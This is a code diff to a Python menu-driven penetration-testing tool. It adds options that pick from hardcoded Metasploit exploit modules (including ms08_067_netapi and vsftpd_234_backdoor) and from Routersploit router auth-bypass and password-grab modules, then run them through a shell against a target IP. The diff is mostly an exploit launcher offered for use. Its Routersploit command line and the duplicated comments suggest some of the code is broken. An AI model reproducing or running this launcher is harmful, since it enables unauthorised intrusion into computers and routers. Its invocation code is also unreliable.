@@ -73,7 +73,7 @@ def show_main_menu_logo():
   / /_/ / __ `/ / __  / _ \/ ___/
  / _, _/ /_/ / / /_/ /  __/ /    
 /_/ |_|\__,_/_/\__,_/\___/_/     
-        testing                                                                                                     
+                                                                                                             
    '''  
    clear_screen()  
    for i, line in enumerate(logo_text.splitlines()):  
@@ -363,6 +363,8 @@ def update_script():
 
 # Function to run Routersploit  
 # Function to run Metasploit  
+# Function to run Metasploit  
+# Function to run Metasploit  
 def metasploit_scan():  
    global scanning_in_progress  
    ip = get_ip_address()  
@@ -375,6 +377,7 @@ def metasploit_scan():
            print("2. Exploit a vulnerability")  
            print("3. Manual Metasploit")  
            print("4. View all Metasploit commands (-h)")  
+           print("5. View Network Exploits")  
            print("99. Return to main menu")  
            choice = input(Fore.BLUE + "\nEnter your choice: ").strip()  
            if choice == '1':  
@@ -422,6 +425,32 @@ def metasploit_scan():
                 output = stdout.decode()  
                 print(Fore.BLUE + "Metasploit Commands:")  
                 print(output)  
+           elif choice == '5':  
+              print(Fore.BLUE + "\nViewing all network exploits...")  
+              exploits = {  
+                "11": "exploit/multi/http/tomcat_mgr_upload",  
+                "22": "exploit/windows/dcerpc/ms03_026_dcom",  
+                "33": "exploit/windows/smb/ms08_067_netapi",  
+                "44": "exploit/unix/ftp/vsftpd_234_backdoor",  
+                "55": "exploit/multi/http/struts2_code_exec",  
+                "66": "exploit/multi/http/jboss_deployment_scanner"  
+              }  
+              for key, value in exploits.items():  
+                print(f"{key}: {value}")  
+              exploit_choice = input(Fore.BLUE + "\nEnter the number of the exploit you want to run: ").strip()  
+              if exploit_choice in exploits:  
+                command = f"msfconsole -q -x 'use {exploits[exploit_choice]}; set RHOSTS {ip}; run'"  
+                print(Fore.BLUE + f"Running {command}...")  
+                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)  
+                stdout, stderr = process.communicate()  
+                if stderr:  
+                   print(Fore.RED + "Error during Metasploit:", stderr.decode())  
+                else:  
+                   output = stdout.decode()  
+                   print(Fore.BLUE + "Metasploit Completed Successfully.")  
+                   print(output)  
+              else:  
+                print(Fore.RED + "Invalid exploit choice.")  
            elif choice == '99':  
               scanning_in_progress = False  
               break  
@@ -431,8 +460,10 @@ def metasploit_scan():
         print(Fore.RED + f"Error running Metasploit: {e}")  
       finally:  
         scanning_in_progress = False  
-        clear_screen()  
+        clear_screen()
+
   
+# Function to run Routersploit  
 # Function to run Routersploit  
 def routersploit_scan():  
    global scanning_in_progress  
@@ -446,6 +477,7 @@ def routersploit_scan():
            print("2. Exploit a vulnerability")  
            print("3. Manual Routersploit")  
            print("4. View all Routersploit commands (-h)")  
+           print("5. View Network Exploits")  
            print("99. Return to main menu")  
            choice = input(Fore.BLUE + "\nEnter your choice: ").strip()  
            if choice == '1':  
@@ -493,6 +525,41 @@ def routersploit_scan():
                 output = stdout.decode()  
                 print(Fore.BLUE + "Routersploit Commands:")  
                 print(output)  
+           elif choice == '5':  
+              print(Fore.BLUE + "\nViewing all network exploits...")  
+              exploits = {  
+                "11": "exploits/cisco/ios/telnet_password_grab",  
+                "22": "exploits/cisco/ios/http_config_traversal",  
+                "33": "exploits/cisco/ios/ssh_password_grab",  
+                "44": "exploits/linksys/e1000/e1000_auth_bypass",  
+                "55": "exploits/linksys/e1200/e1200_auth_bypass",  
+                "66": "exploits/netgear/r7000/r7000_auth_bypass",  
+                "77": "exploits/netgear/r7500/r7500_auth_bypass",  
+                "88": "exploits/dlink/dir_645/dir_645_auth_bypass",  
+                "99": "exploits/dlink/dir_655/dir_655_auth_bypass",  
+                "101": "exploits/tp_link/tl_wr940n/tl_wr940n_auth_bypass",  
+                "102": "exploits/tp_link/tl_wr1043nd/tl_wr1043nd_auth_bypass",  
+                "103": "exploits/asus/rt_n56u/rt_n56u_auth_bypass",  
+                "104": "exploits/asus/rt_ac66u/rt_ac66u_auth_bypass",  
+                "105": "exploits/belkin/f9k1105/f9k1105_auth_bypass",  
+                "106": "exploits/belkin/f9k1115/f9k1115_auth_bypass",  
+              }  
+              for key, value in exploits.items():  
+                print(f"{key}: {value}")  
+              exploit_choice = input(Fore.BLUE + "\nEnter the number of the exploit you want to run: ").strip()  
+              if exploit_choice in exploits:  
+                command = f"routersploit exploit {ip} --exploit {exploits[exploit_choice]}"  
+                print(Fore.BLUE + f"Running {command}...")  
+                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)  
+                stdout, stderr = process.communicate()  
+                if stderr:  
+                   print(Fore.RED + "Error during Routersploit:", stderr.decode())  
+                else:  
+                   output = stdout.decode()  
+                   print(Fore.BLUE + "Routersploit Completed Successfully.")  
+                   print(output)  
+              else:  
+                print(Fore.RED + "Invalid exploit choice.")  
            elif choice == '99':  
               scanning_in_progress = False  
               break  
@@ -503,6 +570,7 @@ def routersploit_scan():
       finally:  
         scanning_in_progress = False  
         clear_screen()
+
 
   
 # Main menu function with options  
